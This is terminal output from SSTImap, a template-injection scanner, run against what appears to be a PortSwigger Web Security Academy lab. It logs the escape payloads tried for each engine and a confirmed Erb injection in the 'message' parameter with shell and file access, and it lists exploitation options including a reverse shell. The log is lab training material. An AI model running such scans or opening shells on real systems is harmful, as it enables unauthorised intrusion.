[34m[*][0m Loaded plugins by categories: languages: 5; engines: 17; generic: 3; legacy_engines: 2
[34m[*][0m Loaded request body types: 4

[93m[*][0m Scanning url: https://0a9a007b03316c22819a537300960027.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
[33m[*][0m Testing if Query parameter 'message' is injectable
[94m[*][0m Cheetah plugin is testing rendering with tag '*'
[34m[*][0m Cheetah plugin is testing }* code context escape with 6 variations
[34m[*][0m Cheetah plugin is testing ]* code context escape with 6 variations
[34m[*][0m Cheetah plugin is testing )* code context escape with 6 variations
[94m[*][0m Cheetah plugin is testing blind injection
[33m[!][0m Blind injection timing varies too much. Increase the timing to avoid false positives.
[34m[*][0m Cheetah plugin is testing }* code context escape with 6 variations
[33m[*][0m Cheetah plugin has detected possible blind injection
[31m[-][0m Possible blind injection turned out to be false positive
[33m[*][0m Cheetah plugin has detected possible blind injection
[31m[-][0m Possible blind injection turned out to be false positive
[34m[*][0m Cheetah plugin is testing ]* code context escape with 6 variations
[33m[*][0m Cheetah plugin has detected possible blind injection
[31m[-][0m Possible blind injection turned out to be false positive
[34m[*][0m Cheetah plugin is testing )* code context escape with 6 variations
[33m[*][0m Cheetah plugin has detected possible blind injection
[31m[-][0m Possible blind injection turned out to be false positive
[94m[*][0m Dot plugin is testing rendering with tag '*'
[34m[*][0m Dot plugin is testing ;}}*{{1; code context escape with 6 variations
[94m[*][0m Dot plugin is testing blind injection
[33m[!][0m Blind injection timing varies too much. Increase the timing to avoid false positives.
[34m[*][0m Dot plugin is testing ;}}*{{1; code context escape with 6 variations
[33m[*][0m Dot plugin has detected possible blind injection
[31m[-][0m Possible blind injection turned out to be false positive
[94m[*][0m Dust plugin is testing rendering
[94m[*][0m Dust plugin is testing blind injection
[33m[!][0m Blind injection timing varies too much. Increase the timing to avoid false positives.
[94m[*][0m Ejs plugin is testing rendering with tag '*'
[34m[*][0m Ejs plugin is testing %>*<%# code context escape with 6 variations
[94m[*][0m Ejs plugin is testing blind injection
[33m[!][0m Blind injection timing varies too much. Increase the timing to avoid false positives.
[34m[*][0m Ejs plugin is testing %>*<%# code context escape with 6 variations
[33m[*][0m Ejs plugin has detected possible blind injection
[31m[-][0m Possible blind injection turned out to be false positive
[33m[*][0m Ejs plugin has detected possible blind injection
[31m[-][0m Possible blind injection turned out to be false positive
[33m[*][0m Ejs plugin has detected possible blind injection
[31m[-][0m Possible blind injection turned out to be false positive
[94m[*][0m Erb plugin is testing rendering with tag '*'
[32m[+][0m Erb plugin has confirmed injection with tag '*'
[92m[+][0m SSTImap identified the following injection point:

  Query parameter: message
  Engine: Erb
  Injection: *
  Context: text
  OS: x86_64-linux-gnu
  Technique: render
  Capabilities:

    Shell command execution: [92mok[0m
    Bind and reverse shell: [92mok[0m
    File write: [92mok[0m
    File read: [92mok[0m
    Code evaluation: [92mok[0m, ruby code

[92m[+][0m Rerun SSTImap providing one of the following options:
    [92m--interactive[0m                Run SSTImap in interactive mode to switch between exploitation modes without losing progress.
    --os-shell                   Prompt for an interactive operating system shell.
    --os-cmd                     Execute an operating system command.
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.
    --tpl-shell                  Prompt for an interactive shell on the template engine.
    --tpl-cmd                    Inject code in the template engine.
    --bind-shell PORT            Connect to a shell bind to a target port.
    --reverse-shell HOST PORT    Send a shell back to the attacker's port.
    --upload LOCAL REMOTE        Upload files to the server.
    --download REMOTE LOCAL      Download remote files.
